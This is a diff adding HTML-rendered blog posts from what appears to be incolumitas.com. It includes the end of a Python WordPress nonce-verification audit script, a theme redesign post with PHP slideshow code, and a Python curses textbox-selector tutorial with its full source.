+    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">root_path</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">fname</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">fname</span><span class="p">:</span>
+                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">fname</span><span class="p">),</span> <span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                    <span class="n">callback</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">fname</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">noncescan</span><span class="p">(</span><span class="n">fdata</span><span class="p">,</span> <span class="n">fname</span><span class="p">):</span>
+    <span class="n">scan_nonce_creation</span><span class="p">(</span><span class="n">fdata</span><span class="p">,</span> <span class="n">fname</span><span class="p">)</span>
+    <span class="n">verify_nonces</span><span class="p">(</span><span class="n">fdata</span><span class="p">,</span> <span class="n">fname</span><span class="p">)</span>
+
+<span class="c"># Returns a list of all nonces created. Very greedy approach.</span>
+<span class="k">def</span> <span class="nf">scan_nonce_creation</span><span class="p">(</span><span class="n">fdata</span><span class="p">,</span> <span class="n">fname</span><span class="p">):</span>
+      <span class="n">dmsg</span><span class="p">(</span><span class="s">&#39;[+] Scanning for nonces in {0}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">fname</span><span class="p">))</span>
+      <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">R_NONCE_CREATION</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">fdata</span><span class="p">):</span>
+          <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">R_STRING</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">()):</span>
+              <span class="n">matches</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>
+
+<span class="c"># Checks with a list if the nonce was verified.</span>
+<span class="k">def</span> <span class="nf">verify_nonces</span><span class="p">(</span><span class="n">fdata</span><span class="p">,</span> <span class="n">fname</span><span class="p">):</span>
+    <span class="n">dmsg</span><span class="p">(</span><span class="s">&#39;[+] Verifing found actions in {0}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">fname</span><span class="p">))</span>
+    <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">R_NONCE_CHECK</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">fdata</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">R_STRING</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">()):</span>
+            <span class="n">checked</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">group</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">report</span><span class="p">():</span>
+    <span class="c"># Now the two lists &#39;matches&#39; and &#39;checked&#39; both hold</span>
+    <span class="c"># all the found $action string arguments that were passed</span>
+    <span class="c"># to the nonce creation functions and again when the nonce</span>
+    <span class="c"># was to be checked. We strip duplicates in both lists and show which</span>
+    <span class="c"># remain in &#39;matches&#39; and aren&#39;t in &#39;checked&#39;.</span>
+    <span class="c"># remark: python is magical!</span>
+    <span class="n">clean</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">[</span><span class="n">i</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;&#39;&quot;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">x</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;[^a-zA-Z0-9_</span><span class="se">\&#39;</span><span class="s">&quot;]&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">)]</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">clean</span><span class="p">(</span><span class="n">matches</span><span class="p">))</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">clean</span><span class="p">(</span><span class="n">checked</span><span class="p">))</span>
+    <span class="n">z</span> <span class="o">=</span> <span class="n">m</span> <span class="o">-</span> <span class="n">c</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">&#39;&#39;&#39; [!] Found {0} strings within nonce creation functions and </span>
+<span class="s">{1} strings in nonce confirming functions. There remain {2} </span>
+<span class="s">strings that are in nonce creation functions, but aren&#39;t in </span>
+<span class="s">confirming functions.&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">m</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">z</span><span class="p">)))</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">z</span><span class="p">)</span>
+
+<span class="c"># Simple debugging function.</span>
+<span class="k">def</span> <span class="nf">dmsg</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">&quot;basedir&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&quot;starting directory of analysis&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+    <span class="n">apply_on_file_content</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">basedir</span><span class="p">,</span> <span class="n">noncescan</span><span class="p">)</span>
+    <span class="n">report</span><span class="p">()</span>
+</pre></div>
+  </div>
+  <hr />
+</article>
+<article>
+  <header>
+    <h2><a href="/redesign-of-incolumitas.html#redesign-of-incolumitas">Major Redesign of incolumitas.com</a></h2>
+    <p>
+      Posted on Mi 24 Juli 2013 in <a href="/category/learning.html">Learning</a>
+      &#8226; Tagged with
+      <a href="/tag/themeprojectsnewredesigncsshtml.html">Themeprojectsnewredesigncsshtml</a>,      <a href="/tag/meta.html">Meta</a>,      <a href="/tag/learning.html">Learning</a>,      <a href="/tag/uncategorized.html">Uncategorized</a>    </p>
+  </header>
+  <div>
+      <p>Hello everybody!</p>
+<p>I finally found some motivation and time to give my blog a design
+upgrade - Basically an endavour that was overdue since this blog has
+seen the light of the day ;)</p>
+<p>On the technical side, this theme is a complete redevelopment. It's not
+finished yet, on the contrary, it's the very first version and there
+remain a lot of issues that need to be resolved. For instance: The
+majority of the CSS code is still rather dirty and of experimental
+nature. Additionally, I want to include an image slideshow based on
+<a href="http://unslider.com/" title="unslider">unslider.js</a>. Your template function
+in the your theme would then look something like the following:</p>
+<div class="highlight"><pre><span class="x">if ( ! function_exists( &#39;clearcontent_header_slider&#39; )):</span>
+<span class="x">/*</span>
+<span class="x"> * This function includes a minimal jquery slideshow into the header of the site. It uses unslider.js in </span>
+<span class="x"> * order to achieve this objective. Link to github site: https://github.com/idiot/unslider</span>
+<span class="x"> */</span>
+<span class="x">function clearcontent_header_slider() {</span>
+<span class="x">    ?&gt;</span>
+
+<span class="x">    &lt;div class=&quot;header-slideshow&quot;&gt;</span>
+<span class="x">        &lt;ul&gt;</span>
+<span class="x">            &lt;li style=&quot;background-image: url(&#39;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">get_template_directory_uri</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;/pics/slideshow/1.png&#39;</span> <span class="cp">?&gt;</span><span class="x">&#39;);&quot;&gt;&lt;/li&gt;</span>
+<span class="x">            &lt;li style=&quot;background-image: url(&#39;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">get_template_directory_uri</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;/pics/slideshow/2.png&#39;</span> <span class="cp">?&gt;</span><span class="x">&#39;);&quot;&gt;&lt;/li&gt;</span>
+<span class="x">            &lt;li style=&quot;background-image: url(&#39;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">get_template_directory_uri</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;/pics/slideshow/3.png&#39;</span> <span class="cp">?&gt;</span><span class="x">&#39;);&quot;&gt;&lt;/li&gt;</span>
+<span class="x">        &lt;/ul&gt;</span>
+<span class="x">    &lt;/div&gt;</span>
+<span class="x">    &lt;script type=&quot;text/javascript&quot;&gt;</span>
+<span class="x">        var $j = jQuery.noConflict();</span>
+
+<span class="x">        // Use jQuery via $j(...) instead of $(..) to prevent name clashes.</span>
+<span class="x">        $j(document).ready(function(){</span>
+<span class="x">            $j(&#39;.header-slideshow&#39;).unslider({</span>
+<span class="x">                    arrows: true,</span>
+<span class="x">                    fluid: true,</span>
+<span class="x">                    dots: true</span>
+<span class="x">            });</span>
+<span class="x">        });</span>
+<span class="x">    &lt;/script&gt;</span>
+<span class="x">    </span><span class="cp">&lt;?php</span>
+<span class="p">}</span>
+<span class="k">endif</span><span class="p">;</span>
+</pre></div>
+
+
+<p>Furthermore, the theme is based on _s, a raw theme ment to be customized and extended. The big advantage are the good coding standards and a robust architecture, which really helps if you're new to wordpress theme development. The authors are partly from the automaticc team, essentially the founders of wordpress, which supports the  reputation of _s further...
+Anyways, expect that the design of incolumitas.com slightly changes over the next weeks and months. A few key points I want to incorporate as soon as possible:</p>
+<ul>
+<li>A static front page (Yes, using front-page.php)</li>
+<li>A complete overhaul of my own captcha plugin. It's really hard to decipher them :D</li>
+<li>Making the theme design responsive. This is easily said, but hard to achieve.</li>
+<li>Uploading all my projects on my GitHub site. And ... </li>
+<li>Finally updating GoogleScraper.py</li>
+</ul>
+<p>That's it for the moment. Stay tuned!
+Nikolai</p>
+  </div>
+  <hr />
+</article>
+<article>
+  <header>
+    <h2><a href="/python-and-curses-a-small-textbox-selection-example.html#python-and-curses-a-small-textbox-selection-example">Python and curses - A small textbox selection example.</a></h2>
+    <p>
+      Posted on So 02 Juni 2013 in <a href="/category/learning.html">Learning</a>
+      &#8226; Tagged with
+      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/learning.html">Learning</a>    </p>
+  </header>
+  <div>
+      <p>Hey dear readership :)</p>
+<h3>What.</h3>
+<p>I recently was in a need of a handy  and nice way (not just pragmatic)
+to chose between different entities in the command line, each of them
+constituting an option. Surely, you can craft a simple menu with
+standard I/O functions, but I wanted to explore something different and
+more beautiful.</p>
+<p>Therefore I found <a href="http://docs.python.org/3.3/howto/curses.html">curses</a>, a simple
+wrapper around ncurses, the famous BSD/UNIX library for portable
+advanced terminal handling.</p>
+<p>So, I dived into this library, I'd recommend
+<a href="http://docs.python.org/3.3/howto/curses.html" title="this">this</a> tutorial for
+everyone who wants to deal with this old school stuff...</p>
+<h3>How.</h3>
+<p>You can check out the recent script on my
+<a href="https://github.com/NikolaiT/Scripts/blob/master/scripts/python/curses/text_selector.py">github</a>
+site. Here is a copy, for everyone to lazy to look it up:</p>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">curses</span>
+
+<span class="c"># Author: Nikolai Tschacher</span>
+<span class="c"># Date: 02.06.2013</span>
+
+<span class="k">class</span> <span class="nc">BoxSelector</span><span class="p">:</span>
+    <span class="sd">&quot;&quot;&quot; Originally designed for accman.py.</span>
+<span class="sd">        Display options build from a list of strings in a (unix) terminal.</span>
+<span class="sd">        The user can browser though the textboxes and select one with enter.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">L</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Create a BoxSelector object. </span>
+<span class="sd">            L is a list of strings. Each string is used to build </span>
+<span class="sd">            a textbox.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">L</span> <span class="o">=</span> <span class="n">L</span>
+        <span class="c"># Element parameters. Change them here.</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">TEXTBOX_WIDTH</span> <span class="o">=</span> <span class="mi">50</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">TEXTBOX_HEIGHT</span> <span class="o">=</span> <span class="mi">6</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">PAD_WIDTH</span> <span class="o">=</span> <span class="mi">400</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">PAD_HEIGHT</span> <span class="o">=</span> <span class="mi">10000</span>
+
+    <span class="k">def</span> <span class="nf">pick</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Just run this when you want to spawn the selction process. &quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_init_curses</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_create_pad</span><span class="p">()</span>
+
+        <span class="n">windows</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_make_textboxes</span><span class="p">()</span>
+        <span class="n">picked</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_select_textbox</span><span class="p">(</span><span class="n">windows</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">_end_curses</span><span class="p">()</span>
+
+        <span class="k">return</span> <span class="n">picked</span>
+
+    <span class="k">def</span> <span class="nf">_init_curses</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Inits the curses appliation &quot;&quot;&quot;</span>
+        <span class="c"># initscr() returns a window object representing the entire screen.</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">stdscr</span> <span class="o">=</span> <span class="n">curses</span><span class="o">.</span><span class="n">initscr</span><span class="p">()</span>
+        <span class="c"># turn off automatic echoing of keys to the screen</span>
+        <span class="n">curses</span><span class="o">.</span><span class="n">noecho</span><span class="p">()</span>
+        <span class="c"># Enable non-blocking mode. Keys are read directly, without hitting enter.</span>
+        <span class="n">curses</span><span class="o">.</span><span class="n">cbreak</span><span class="p">()</span>
+        <span class="c"># Disable the mouse cursor.</span>
+        <span class="n">curses</span><span class="o">.</span><span class="n">curs_set</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">stdscr</span><span class="o">.</span><span class="n">keypad</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="c"># Enable colorous output.</span>
+        <span class="n">curses</span><span class="o">.</span><span class="n">start_color</span><span class="p">()</span>
+        <span class="n">curses</span><span class="o">.</span><span class="n">init_pair</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">curses</span><span class="o">.</span><span class="n">COLOR_BLACK</span><span class="p">,</span> <span class="n">curses</span><span class="o">.</span><span class="n">COLOR_GREEN</span><span class="p">)</span>
+        <span class="n">curses</span><span class="o">.</span><span class="n">init_pair</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">curses</span><span class="o">.</span><span class="n">COLOR_WHITE</span><span class="p">,</span> <span class="n">curses</span><span class="o">.</span><span class="n">COLOR_BLACK</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">stdscr</span><span class="o">.</span><span class="n">bkgd</span><span class="p">(</span><span class="n">curses</span><span class="o">.</span><span class="n">color_pair</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">stdscr</span><span class="o">.</span><span class="n">refresh</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">_end_curses</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Terminates the curses application. &quot;&quot;&quot;</span>
+        <span class="n">curses</span><span class="o">.</span><span class="n">nocbreak</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">stdscr</span><span class="o">.</span><span class="n">keypad</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">curses</span><span class="o">.</span><span class="n">echo</span><span class="p">()</span>
+        <span class="n">curses</span><span class="o">.</span><span class="n">endwin</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">_create_pad</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Creates a big self.pad to place the textboxes in. &quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">pad</span> <span class="o">=</span> <span class="n">curses</span><span class="o">.</span><span class="n">newpad</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">PAD_HEIGHT</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">PAD_WIDTH</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">pad</span><span class="o">.</span><span class="n">box</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">_make_textboxes</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Build the textboxes in the pad center and put them in the </span>
+<span class="sd">            horizontal middle of the pad. &quot;&quot;&quot;</span>
+        <span class="c"># Get the actual screensize.</span>
+        <span class="n">maxy</span><span class="p">,</span> <span class="n">maxx</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stdscr</span><span class="o">.</span><span class="n">getmaxyx</span><span class="p">()</span>
+
+        <span class="n">windows</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">L</span><span class="p">:</span>
+            <span class="n">windows</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pad</span><span class="o">.</span><span class="n">derwin</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">TEXTBOX_HEIGHT</span><span class="p">,</span>
+                    <span class="bp">self</span><span class="o">.</span><span class="n">TEXTBOX_WIDTH</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">PAD_WIDTH</span><span class="o">//</span><span class="mi">2</span><span class="o">-</span><span class="bp">self</span><span class="o">.</span><span class="n">TEXTBOX_WIDTH</span><span class="o">//</span><span class="mi">2</span><span class="p">))</span>
+            <span class="n">i</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">TEXTBOX_HEIGHT</span>
+
+        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">windows</span><span class="p">)):</span>
+            <span class="n">windows</span><span class="p">[</span><span class="n">k</span><span class="p">]</span><span class="o">.</span><span class="n">box</span><span class="p">()</span>
+            <span class="n">windows</span><span class="p">[</span><span class="n">k</span><span class="p">]</span><span class="o">.</span><span class="n">addstr</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="s">&#39;0x{0:X} - {1}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">L</span><span class="p">[</span><span class="n">k</span><span class="p">]))</span>
+
+        <span class="k">return</span> <span class="n">windows</span>
+
+    <span class="k">def</span> <span class="nf">_center_view</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">window</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Centers and aligns the view according to the window argument given. </span>
+<span class="sd">            Returns the (y, x) coordinates of the centered window. &quot;&quot;&quot;</span>
+        <span class="c"># The refresh() and noutrefresh() methods of a self.pad require 6 arguments</span>
+        <span class="c"># to specify the part of the self.pad to be displayed and the location on</span>
+        <span class="c"># the screen to be used for the display. The arguments are pminrow,</span>
+        <span class="c"># pmincol, sminrow, smincol, smaxrow, smaxcol; the p arguments refer</span>
+        <span class="c"># to the upper left corner of the self.pad region to be displayed and the</span>
+        <span class="c"># s arguments define a clipping box on the screen within which the</span>
+        <span class="c"># self.pad region is to be displayed.</span>
+        <span class="n">cy</span><span class="p">,</span> <span class="n">cx</span> <span class="o">=</span> <span class="n">window</span><span class="o">.</span><span class="n">getbegyx</span><span class="p">()</span>
+        <span class="n">maxy</span><span class="p">,</span> <span class="n">maxx</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stdscr</span><span class="o">.</span><span class="n">getmaxyx</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">pad</span><span class="o">.</span><span class="n">refresh</span><span class="p">(</span><span class="n">cy</span><span class="p">,</span> <span class="n">cx</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">maxx</span><span class="o">//</span><span class="mi">2</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">TEXTBOX_WIDTH</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">maxy</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">maxx</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">cy</span><span class="p">,</span> <span class="n">cx</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">_select_textbox</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">windows</span><span class="p">):</span>
+        <span class="c"># See at the root textbox.</span>
+        <span class="n">topy</span><span class="p">,</span> <span class="n">topx</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_center_view</span><span class="p">(</span><span class="n">windows</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+
+        <span class="n">current_selected</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">last</span> <span class="o">=</span> <span class="mi">1</span>
+        <span class="n">top_textbox</span> <span class="o">=</span> <span class="n">windows</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="c"># Highligth the selected one, the last selected textbox should</span>
+            <span class="c"># become normal again.</span>
+            <span class="n">windows</span><span class="p">[</span><span class="n">current_selected</span><span class="p">]</span><span class="o">.</span><span class="n">bkgd</span><span class="p">(</span><span class="n">curses</span><span class="o">.</span><span class="n">color_pair</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+            <span class="n">windows</span><span class="p">[</span><span class="n">last</span><span class="p">]</span><span class="o">.</span><span class="n">bkgd</span><span class="p">(</span><span class="n">curses</span><span class="o">.</span><span class="n">color_pair</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+
+            <span class="c"># While the textbox can be displayed on the page with the current </span>
+            <span class="c"># top_textbox, don&#39;t alter the view. When this becomes impossible, </span>
+            <span class="c"># center the view to last displayable textbox on the previous view.</span>
+            <span class="n">maxy</span><span class="p">,</span> <span class="n">maxx</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stdscr</span><span class="o">.</span><span class="n">getmaxyx</span><span class="p">()</span>
+            <span class="n">cy</span><span class="p">,</span> <span class="n">cx</span> <span class="o">=</span> <span class="n">windows</span><span class="p">[</span><span class="n">current_selected</span><span class="p">]</span><span class="o">.</span><span class="n">getbegyx</span><span class="p">()</span>
+
+            <span class="c"># The current window is to far down. Switch the top textbox.</span>
+            <span class="k">if</span> <span class="p">((</span><span class="n">topy</span> <span class="o">+</span> <span class="n">maxy</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">TEXTBOX_HEIGHT</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">cy</span><span class="p">):</span>
+                <span class="n">top_textbox</span> <span class="o">=</span> <span class="n">windows</span><span class="p">[</span><span class="n">current_selected</span><span class="p">]</span>
+
+            <span class="c"># The current window is to far up. There is a better way though...</span>
+            <span class="k">if</span> <span class="n">topy</span> <span class="o">&gt;=</span> <span class="n">cy</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">TEXTBOX_HEIGHT</span><span class="p">:</span>
+                <span class="n">top_textbox</span> <span class="o">=</span> <span class="n">windows</span><span class="p">[</span><span class="n">current_selected</span><span class="p">]</span>
+
+            <span class="k">if</span> <span class="n">last</span> <span class="o">!=</span> <span class="n">current_selected</span><span class="p">:</span>
+                <span class="n">last</span> <span class="o">=</span> <span class="n">current_selected</span>
+
+            <span class="n">topy</span><span class="p">,</span> <span class="n">topx</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_center_view</span><span class="p">(</span><span class="n">top_textbox</span><span class="p">)</span>
+
+            <span class="n">c</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stdscr</span><span class="o">.</span><span class="n">getch</span><span class="p">()</span>
+
+            <span class="c"># Vim like KEY_UP/KEY_DOWN with j(DOWN) and k(UP).</span>
+            <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;j&#39;</span><span class="p">):</span>
+                <span class="k">if</span> <span class="n">current_selected</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">windows</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+                    <span class="n">current_selected</span> <span class="o">=</span> <span class="mi">0</span> <span class="c"># wrap around.</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">current_selected</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;k&#39;</span><span class="p">):</span>
+                <span class="k">if</span> <span class="n">current_selected</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="n">current_selected</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">windows</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span> <span class="c"># wrap around.</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">current_selected</span> <span class="o">-=</span> <span class="mi">1</span>
+            <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;q&#39;</span><span class="p">):</span> <span class="c"># Quit without selecting.</span>
+                <span class="k">break</span>
+            <span class="c"># At hitting enter, return the index of the selected list element.</span>
+            <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="n">curses</span><span class="o">.</span><span class="n">KEY_ENTER</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">10</span><span class="p">:</span>
+                <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">current_selected</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="c"># As simple as that.</span>
+    <span class="n">L</span> <span class="o">=</span> <span class="p">[</span>
+         <span class="s">&#39;I wish I was a wizard&#39;</span><span class="p">,</span>
+         <span class="s">&#39;Sometimes it all just makes sense&#39;</span><span class="p">,</span>
+         <span class="s">&#39;This string is here because I need it&#39;</span><span class="p">,</span>
+         <span class="s">&#39;Being or not being!&#39;</span><span class="p">,</span>
+         <span class="s">&#39;Python is worse then PHP ;)&#39;</span><span class="p">,</span>
+         <span class="s">&#39;a -&gt; b &lt;=&gt; if a then b&#39;</span>
+        <span class="p">]</span>
+
+    <span class="n">choice</span> <span class="o">=</span> <span class="n">BoxSelector</span><span class="p">(</span><span class="n">L</span><span class="p">)</span><span class="o">.</span><span class="n">pick</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">&#39;[+] Your choice was &quot;{0}&quot;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">L</span><span class="p">[</span><span class="n">choice</span><span class="p">]))</span>
+</pre></div>
+
+
+<p>As you can see, it is very easy to make such a browsable text selection
+command line interface. Just pass you list of strings to a BoxSelector()
+class and call the method pick(), which creates all the terminal
+interface stuff and terminates if a user chose a textbox with hitting
+enter...</p>
+<p>Here is a little picture illustrating the above example:<br />
+[<img alt="text_selector.py illustration" src="/uploads/2013/06/Bildschirmfoto-vom-2013-06-02-190913-1024x576.png" /></p>
+  </div>
+  <hr />
+</article>
+<article>
+  <header>
